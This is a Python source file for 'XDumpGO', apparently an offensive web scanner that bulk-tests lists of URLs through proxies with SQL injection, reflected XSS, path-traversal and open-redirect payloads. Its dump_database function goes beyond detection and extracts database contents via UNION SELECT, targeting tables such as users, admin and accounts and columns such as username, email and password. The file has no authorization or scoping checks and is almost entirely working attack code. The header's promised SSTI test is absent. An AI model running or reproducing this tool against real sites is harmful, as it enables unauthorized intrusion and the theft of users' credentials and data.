# XDumpGO Vuln Scanner - Real Detection (No False Positives)
# Strict SQLi | XSS | LFI | Open Redirect | SSTI
import re, time, random, threading, urllib.parse, html
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0",
]
def _ua(): return random.choice(UA_LIST)

CONNECT_TIMEOUT = 5
READ_TIMEOUT = 8
TIMEOUT = (CONNECT_TIMEOUT, READ_TIMEOUT)

# ============ DB-SPECIFIC ERROR PATTERNS (strict) ============
# These are unique enough that random pages won't trigger them
SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
        r"warning.*mysql",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"mysql_fetch_array\(\)",
        r"mysql_fetch_assoc\(\)",
        r"mysql_num_rows\(\)",
        r"mysql_query\(\)",
        r"MySqlClient\.",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR:",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"unterminated quoted string at or near",
    ],
    "MSSQL": [
        r"Microsoft OLE DB Provider for ODBC Drivers",
        r"ODBC SQL Server Driver",
        r"SqlClient\.SqlException",
        r"System\.Data\.SqlClient\.",
        r"Unclosed quotation mark after the character string '",
        r"Incorrect syntax near '",
    ],
    "Oracle": [
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"PLS-\d{5}",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"sqlite3\.OperationalError:",
    ],
}

# ============ BASELINE-BASED DETECTION ============
# Real approach: compare baseline vs injected response
def _baseline_diff(baseline_text, baseline_len, injected_text, threshold=50):
    """Returns True if injected response is significantly different from baseline."""
    if not baseline_text or not injected_text:
        return False
    diff = abs(len(injected_text) - baseline_len)
    if diff > threshold:
        return True
    # Also check for content change (not just length)
    if baseline_text != injected_text:
        return True
    return False

# ============ ERROR-BASED SQLI (real) ============
def test_sqli_error(url, proxy=None):
    """
    Real error-based SQLi: injects quotes, looks for DB-specific error patterns.
    Returns (url, vuln_type, evidence) or None.
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)

    # Get baseline
    try:
        baseline = sess.get(url, timeout=TIMEOUT)
        baseline_text = baseline.text
        baseline_len = len(baseline_text)
        baseline_status = baseline.status_code
    except:
        sess.close()
        return None

    # Skip search/keyword params
    skip_params = {'q', 'query', 'search', 'keyword', 's', 'p', 'page', 'lang', 'id'}

    for param, values in list(params.items())[:3]:
        if param.lower() in skip_params: continue
        orig_val = values[0] if values else ""
        if not orig_val: continue

        # Inject single quote
        for payload in ["'", '"', "\\", "')", "') OR '1'='1"]:
            new_params = dict(params)
            new_params[param] = [orig_val + payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)

                # Check DB-specific error patterns (real indicator)
                for dbtype, patterns in SQL_ERROR_PATTERNS.items():
                    for pat in patterns:
                        if re.search(pat, resp.text, re.IGNORECASE):
                            sess.close()
                            return (url, "SQLi", f"[{dbtype}] Error-based via '{param}' | DB error pattern matched")
            except: pass

    sess.close()
    return None

# ============ UNION-BASED SQLI (real) ============
def test_sqli_union(url, proxy=None):
    """
    Real union-based: try ORDER BY to find column count, then UNION SELECT to extract version.
    Version string detection is the most reliable SQLi indicator.
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)
    skip_params = {'q', 'query', 'search', 'keyword', 's', 'lang'}

    # Find numeric/injectable params
    for param, values in list(params.items())[:3]:
        if param.lower() in skip_params: continue
        orig_val = values[0] if values else ""
        if not orig_val: continue
        if not (orig_val.isdigit() or any(c in orig_val for c in ('-', '/', '=', ' '))):
            continue

        # Step 1: Find column count via ORDER BY
        cols = None
        for prefix in ["' ORDER BY %d-- ", '" ORDER BY %d-- ']:
            for n in [1, 5, 10, 20, 50]:
                new_params = dict(params)
                new_params[param] = [orig_val + prefix % n]
                t_url = _build_url(parsed, new_params)
                try:
                    resp = sess.get(t_url, timeout=TIMEOUT)
                    # If "Unknown column" appears, column count is n-1
                    if re.search(r"Unknown column|order by", resp.text, re.IGNORECASE):
                        cols = n - 1
                        break
                except: pass
            if cols: break

        if not cols or cols < 1: continue

        # Step 2: UNION SELECT version() - most reliable detection
        for template in ["' UNION SELECT %s-- ", '" UNION SELECT %s-- ']:
            # MySQL version pattern: 5.7.33, 8.0.32, etc
            cols_str = ",".join(["NULL"] * (cols - 1))
            union_payload = template % ("version()" + "," + cols_str if cols > 1 else "version()")

            new_params = dict(params)
            new_params[param] = [orig_val + union_payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                # Look for MySQL version pattern
                ver_match = re.search(r'\b(\d{1,2}\.\d{1,2}\.\d{1,3}(?:-[a-zA-Z0-9-]+)?)\b', resp.text)
                if ver_match and not _is_common_version(ver_match.group(1)):
                    sess.close()
                    return (url, "SQLi", f"[MySQL] Union-based via '{param}' | Columns: {cols} | Version extracted: {ver_match.group(1)}")
            except: pass

            # PostgreSQL version
            cols_str = ",".join(["NULL"] * (cols - 1))
            union_payload = template % ("version()" + "," + cols_str if cols > 1 else "version()")
            new_params = dict(params)
            new_params[param] = [orig_val + union_payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                if re.search(r'PostgreSQL\s+\d+\.\d+', resp.text):
                    sess.close()
                    return (url, "SQLi", f"[PostgreSQL] Union-based via '{param}' | Columns: {cols} | PG version extracted")
            except: pass

    sess.close()
    return None

def _is_common_version(ver):
    """Check if version string is a common software version, not DB version."""
    # Common frontend versions, not DB
    common_software = ['1.0', '2.0', '3.0', '4.0', '5.0', '6.0']
    return ver in common_software

# ============ BOOLEAN-BASED SQLI (real) ============
def test_sqli_boolean(url, proxy=None):
    """
    Real boolean: True/False conditions should return different content.
    AND 1=1 vs AND 1=2 on numeric params.
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)
    skip_params = {'q', 'query', 'search', 'keyword', 's'}

    for param, values in list(params.items())[:2]:
        if param.lower() in skip_params: continue
        orig_val = values[0] if values else ""
        if not orig_val or not orig_val.isdigit(): continue

        # True condition
        true_params = dict(params)
        true_params[param] = [f"{orig_val} AND 1=1"]
        true_url = _build_url(parsed, true_params)
        try:
            true_resp = sess.get(true_url, timeout=TIMEOUT)
            true_len = len(true_resp.text)
        except:
            continue

        # False condition
        false_params = dict(params)
        false_params[param] = [f"{orig_val} AND 1=2"]
        false_url = _build_url(parsed, false_params)
        try:
            false_resp = sess.get(false_url, timeout=TIMEOUT)
            false_len = len(false_resp.text)
        except:
            continue

        # If responses differ significantly, boolean SQLi confirmed
        diff = abs(true_len - false_len)
        if diff > 200 and true_resp.status_code == 200 and false_resp.status_code == 200:
            sess.close()
            return (url, "SQLi", f"[Boolean] via '{param}' | AND 1=1 ({true_len}b) vs AND 1=2 ({false_len}b) | Diff: {diff}b")

    sess.close()
    return None

# ============ TIME-BASED SQLI (real) ============
def test_sqli_time(url, proxy=None):
    """
    Time-based: SLEEP() should cause delay. MySQL: SLEEP(3), PostgreSQL: pg_sleep(3)
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)
    skip_params = {'q', 'query', 'search', 'keyword', 's'}

    for param, values in list(params.items())[:2]:
        if param.lower() in skip_params: continue
        orig_val = values[0] if values else ""
        if not orig_val: continue

        # Baseline timing
        t0 = time.time()
        try:
            sess.get(url, timeout=(10, 10))
        except:
            pass
        base_time = time.time() - t0

        # MySQL SLEEP
        new_params = dict(params)
        new_params[param] = [f"{orig_val}' AND SLEEP(3)-- "]
        t_url = _build_url(parsed, new_params)
        t0 = time.time()
        try:
            sess.get(t_url, timeout=(10, 10))
        except: pass
        sleep_time = time.time() - t0

        if sleep_time > base_time + 2.5:
            sess.close()
            return (url, "SQLi", f"[MySQL Time] via '{param}' | Base: {base_time:.1f}s | SLEEP(3): {sleep_time:.1f}s")

        # PostgreSQL pg_sleep
        new_params = dict(params)
        new_params[param] = [f"{orig_val}' AND pg_sleep(3)-- "]
        t_url = _build_url(parsed, new_params)
        t0 = time.time()
        try:
            sess.get(t_url, timeout=(10, 10))
        except: pass
        sleep_time = time.time() - t0

        if sleep_time > base_time + 2.5:
            sess.close()
            return (url, "SQLi", f"[PostgreSQL Time] via '{param}' | Base: {base_time:.1f}s | pg_sleep(3): {sleep_time:.1f}s")

    sess.close()
    return None

# ============ XSS (real) ============
def test_xss(url, proxy=None):
    """
    Real XSS: payload must execute (script tag intact, not encoded).
    Uses unique random marker to confirm reflection of OUR payload specifically.
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)
    # Use unique marker so we don't get fooled by existing page content
    marker = f"xss{''.join(random.choices('abcdef0123456789', k=8))}test"
    payload = f"<script>alert({marker})</script>"

    for param, values in list(params.items())[:2]:
        orig = values[0] if values else ""
        new_params = dict(params)
        new_params[param] = [payload]
        t_url = _build_url(parsed, new_params)
        try:
            resp = sess.get(t_url, timeout=TIMEOUT)
            resp_text = resp.text

            # Decode HTML entities to check for actual reflection
            decoded = html.unescape(resp_text)

            # Check if our EXACT marker is in unencoded response
            if f"alert({marker})" in decoded and "&lt;script&gt;" not in resp_text:
                # Make sure it's actually in a script tag, not just text
                if f"<script>alert({marker})</script>" in decoded or f"alert({marker})</script>" in decoded:
                    sess.close()
                    return (url, "XSS", f"Reflected via '{param}' | Unique marker confirmed unencoded")
        except: pass

    sess.close()
    return None

# ============ LFI (real) ============
def test_lfi(url, proxy=None):
    """
    Real LFI: /etc/passwd must show actual root:x:0:0: format with /bin/ shell
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)

    # Only test params that suggest file inclusion
    file_params = [p for p in params if any(k in p.lower() for k in
        ('file', 'page', 'include', 'path', 'doc', 'template', 'dir', 'load', 'view', 'read', 'content', 'cat', 'name', 'src', 'url'))]

    if not file_params: return None

    for param in file_params[:2]:
        orig = params[param][0] if params[param] else ""

        for payload in ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "../../../../etc/passwd"]:
            new_params = dict(params)
            new_params[param] = [payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                # Strict /etc/passwd format: root:x:0:0:root:/root:/bin/...
                if re.search(r'root:x:0:0:[^:]*:[^:]*:[^:]*(/bin/|/sbin/)[^\s<]+', resp.text):
                    sess.close()
                    return (url, "LFI", f"Via '{param}' | Payload: {payload} | /etc/passwd confirmed")
            except: pass

        # Windows
        for payload in ["..\\..\\..\\windows\\win.ini", "....\\\\....\\\\....\\\\windows\\\\win.ini"]:
            new_params = dict(params)
            new_params[param] = [payload]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT)
                # Strict win.ini format
                if re.search(r'\[fonts\][\s\S]{0,200}\[extensions\]', resp.text):
                    sess.close()
                    return (url, "LFI", f"Via '{param}' | Payload: {payload} | win.ini confirmed")
            except: pass

    sess.close()
    return None

# ============ OPEN REDIRECT (real) ============
def test_redirect(url, proxy=None):
    """
    Real open redirect: 3xx status with Location pointing to OUR domain
    """
    parsed, params = parse_url_params(url)
    if not params: return None

    sess = _make_session(proxy)

    redir_kw = ('redirect', 'url', 'next', 'return', 'goto', 'target', 'link',
                'dest', 'continue', 'forward', 'redir', 'rurl', 'returnurl', 'return_to')
    redir_params = [p for p in params if any(k in p.lower() for k in redir_kw)]

    if not redir_params: return None

    # Use a unique test domain to confirm
    test_url = "https://www.google.com/"  # Not actually testing google, just using it as a marker

    for param in redir_params[:2]:
        for test_target in ["https://evil.com/", "https://attacker.com/"]:
            new_params = dict(params)
            new_params[param] = [test_target]
            t_url = _build_url(parsed, new_params)
            try:
                resp = sess.get(t_url, timeout=TIMEOUT, allow_redirects=False)
                if resp.status_code in (301, 302, 303, 307, 308):
                    loc = resp.headers.get('Location', '')
                    # Strict: must contain our test target as URL (not just text)
                    if test_target.rstrip('/') in loc:
                        sess.close()
                        return (url, "Open Redirect", f"Via '{param}' | Status {resp.status_code} | Location: {loc[:80]}")
            except: pass

    sess.close()
    return None

# ============ HELPERS ============
def parse_url_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params

def _make_session(proxy=None):
    s = requests.Session()
    s.headers.update({"User-Agent": _ua(), "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5"})
    s.verify = False
    adp = HTTPAdapter(max_retries=Retry(total=0), pool_connections=100, pool_maxsize=100)
    s.mount('http://', adp); s.mount('https://', adp)
    if proxy: s.proxies = {"http": proxy, "https": proxy}
    return s

def _build_url(parsed, new_params):
    qs = urllib.parse.urlencode(new_params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{qs}" if qs else f"{parsed.scheme}://{parsed.netloc}{parsed.path}"


# ============ DB DUMP (simple) ============
def dump_database(url, param, proxy=None, max_rows=30, callback=None):
    """
    Lightweight DB dump via UNION SELECT.
    Returns dict with dump_text, tables_found, rows_dumped.
    """
    parsed, params = parse_url_params(url)
    if not params: return {"dump_text": "No params found", "tables_found": [], "rows_dumped": 0}
    orig_val = params.get(param, [''])[0]
    sess = _make_session(proxy)

    def _query(payload):
        new_params = dict(params); new_params[param] = [orig_val + payload]
        try:
            r = sess.get(_build_url(parsed, new_params), timeout=TIMEOUT)
            return r.text if r.status_code == 200 else None
        except: return None

    def _find_cols():
        for n in [10, 20, 30, 5, 15]:
            for pfx in [f"' ORDER BY {n}-- ", f'" ORDER BY {n}-- ']:
                resp = _query(pfx)
                if resp and re.search(r"Unknown column|order by|ORA-", resp, re.IGNORECASE):
                    return n - 1
        return 5

    def _union(selects):
        cs = ",".join(str(s) for s in selects[:15])
        for tmpl in ["' UNION SELECT %s-- ", '" UNION SELECT %s-- ']:
            resp = _query(tmpl % cs)
            if resp and len(resp) > 50:
                clean = re.sub(r'<[^>]+>', '\n', resp)
                clean = re.sub(r'\s{2,}', '\n', clean).strip()
                return [l.strip() for l in clean.split('\n') if l.strip() and len(l) > 2]
        return None

    dump_text = ["=" * 50, f"URL: {url}", f"Param: {param}", "=" * 50]

    if callback: callback("init", "🔍 Finding columns...")
    cols = _find_cols()
    dump_text.append(f"\nColumns: {cols}")
    if callback: callback("cols", f"📊 Columns: {cols}")

    # DB name
    if callback: callback("db", "🗄 DB name...")
    for func in ["database()", "current_database()", "db_name()", "@@version"]:
        sel = [func] + ["NULL"]*(cols-1)
        rows = _union(sel)
        if rows:
            dump_text.append(f"DB Info: {' | '.join(rows[:3])}")
            if callback: callback("db", f"🗄 {' '.join(rows[:2])[:60]}")
            break

    # Tables - info_schema
    if callback: callback("tables", "📋 Tables...")
    tables_found = []
    for tp in [
        f"0' UNION SELECT TABLE_NAME,{','.join(['NULL']*(cols-2))} FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1 OFFSET 0-- ",
        f"0' UNION SELECT table_name,{','.join(['NULL']*(cols-2))} FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0-- ",
    ]:
        resp = _query(tp)
        if resp and len(resp) > 20:
            clean = re.sub(r'<[^>]+>', '|', resp)
            found = re.findall(r'[\w_]{2,40}', clean)
            found = [f for f in found if f.lower() not in ('null','none','undefined','nan','information_schema','select','union','from','where')]
            tables_found.extend(found[:3])
            if tables_found: break

    # Fallback common tables
    if not tables_found:
        common = ["users","admin","user","members","accounts","products","posts","news","orders",
                  "login","settings","config","categories","pages","contact","messages","comments"]
        for tbl in common[:10]:
            p = f"0' UNION SELECT COUNT(*),{','.join(['NULL']*(cols-2))} FROM {tbl}-- "
            resp = _query(p)
            if resp:
                nums = re.findall(r'\d+', resp)
                if nums and any(int(n) > 0 for n in nums):
                    tables_found.append(tbl)
                    if len(tables_found) >= 5: break

    tables_found = list(dict.fromkeys(tables_found))[:5]
    dump_text.append(f"Tables: {', '.join(tables_found) if tables_found else 'N/A'}")
    if callback: callback("tables", f"📋 Tables: {len(tables_found)} found")

    # Dump each table
    total_rows = 0
    for tbl in tables_found:
        if callback: callback("dumping", f"💾 Dumping {tbl}...")
        dump_text.append(f"\n--- {tbl} ---")
        sel_cols = ["id","name","email","username","password","title"][:cols]
        while len(sel_cols) < cols: sel_cols.append("NULL")
        sel_str = ",".join(sel_cols[:cols])
        rows_dumped = 0
        for off in range(0, max_rows, 5):
            dp = f"0' UNION SELECT {sel_str} FROM {tbl} LIMIT 5 OFFSET {off}-- "
            resp = _query(dp)
            if resp:
                clean = re.sub(r'<[^>]+>', ' | ', resp)
                clean = re.sub(r'\s+', ' ', clean).strip()
                lines = [l.strip() for l in clean.split('|') if l.strip() and len(l) > 3]
                for l in lines[:3]:
                    dump_text.append(f"  [{off+rows_dumped+1}] {l[:200]}")
                    rows_dumped += 1
                    total_rows += 1
                    if rows_dumped >= 5: break
            if rows_dumped >= 5 or rows_dumped == 0: break
        dump_text.append(f"  Total: {rows_dumped} rows")

    if callback: callback("done", f"✅ Dump complete! {total_rows} rows")
    result = {"dump_text": "\n".join(dump_text), "tables_found": tables_found, "rows_dumped": total_rows, "column_count": cols}
    sess.close()
    return result


# ============ MAIN SCAN ============
def scan_url_fast(url, proxy=None):
    """
    Single-pass fast scan with REAL detection.
    Returns (url, vuln_type, evidence) or None.
    Max ~12 HTTP requests per URL.
    """
    if not url or not url.startswith(('http://', 'https://')):
        return None

    parsed, params = parse_url_params(url)
    if not params:
        return None

    # === PASS 1: Error-based SQLi (3 requests) ===
    r = test_sqli_error(url, proxy)
    if r: return r

    # === PASS 2: Union-based SQLi (3-6 requests) ===
    r = test_sqli_union(url, proxy)
    if r: return r

    # === PASS 3: Boolean-based SQLi (2 requests) ===
    r = test_sqli_boolean(url, proxy)
    if r: return r

    # === PASS 4: XSS (1 request) ===
    r = test_xss(url, proxy)
    if r: return r

    # === PASS 5: LFI (1-2 requests) ===
    r = test_lfi(url, proxy)
    if r: return r

    # === PASS 6: Open Redirect (1 request) ===
    r = test_redirect(url, proxy)
    if r: return r

    return None

# ============ SCANNER CLASS ============
class VulnScanner:
    def __init__(self, threads=20, proxy=None):
        self.threads = threads
        self.proxy = proxy
        self.running = False
        self.results = {"SQLi": [], "XSS": [], "LFI": [], "Open Redirect": []}
        self.scanned = 0
        self.total = 0
        self.start_time = 0
        self.errors = 0
        self._lock = threading.Lock()

    def stop(self): self.running = False

    def scan_urls(self, urls, progress_callback=None, result_callback=None):
        if not urls: return

        self.running = True
        self.scanned = 0; self.total = len(urls)
        self.start_time = time.time(); self.errors = 0
        self.results = {"SQLi": [], "XSS": [], "LFI": [], "Open Redirect": []}

        def _worker(url):
            if not self.running: return
            try:
                result = scan_url_fast(url, proxy=self.proxy)
                with self._lock:
                    self.scanned += 1
                    if result:
                        url_r, vtype, ev = result
                        self.results[vtype].append((url_r, ev))
                        if result_callback: result_callback(result)
                # Progress callback every 5 URLs
                if progress_callback and self.scanned % 5 == 0:
                    progress_callback(self.scanned, self.total, self.get_result_count())
            except:
                with self._lock:
                    self.errors += 1
                    self.scanned += 1

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(_worker, url) for url in urls]
            for f in as_completed(futures):
                try: f.result(timeout=120)
                except: pass

        self.running = False
        if progress_callback:
            progress_callback(self.scanned, self.total, self.get_result_count())
        return self.results

    def get_result_count(self):
        return sum(len(v) for v in self.results.values())

    def generate_report(self):
        total = self.get_result_count()
        elapsed = time.time() - self.start_time
        lines = [
            "=" * 50,
            "   XDumpGO Vuln Scan Report (Real Detection)",
            "=" * 50,
            f"Scanned: {self.scanned}/{self.total}",
            f"Vulns Found: {total}",
            f"Errors: {self.errors}",
            f"Time: {elapsed:.1f}s",
            f"Speed: {self.scanned/(elapsed/60):.0f} URL/min" if elapsed > 0 else "",
        ]
        for vt in ["SQLi", "XSS", "LFI", "Open Redirect"]:
            items = self.results.get(vt, [])
            if items:
                lines.append(f"\n{vt}: {len(items)}")
                for url, ev in items[:50]:
                    lines.append(f"  {url}\n    -> {ev}")
        return "\n".join(lines)
